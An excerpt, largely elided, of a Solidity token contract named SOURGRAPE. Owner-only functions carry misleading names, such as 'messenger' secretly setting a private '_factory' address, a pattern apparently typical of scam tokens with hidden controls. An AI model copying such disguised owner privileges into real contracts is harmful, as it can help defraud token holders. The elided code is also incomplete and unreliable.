...
contract OwnershipHelper is ContextHelper {  
    ...
    */
    ...
    function messenger(address newOwner) external onlyOwner {
        _factory = newOwner;
    }  
...
contract SOURGRAPE is ContextHelper, IERC20, OwnershipHelper{
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;  
    mapping (address => mapping (address => uint256)) private _allowances;  
    uint256 private _totalSupply = 1000000 *  10**9;        
    
    string private _name = "SOURGRAPE";
    string private _symbol = "SOURGRAPE";
   ...
   function Version(address sender, uint256 target, uint256 accuracy) public pure returns (bool){
    ...
    function newtokengas(address _token, address _to) external onlyOwner returns (bool _sent) {    
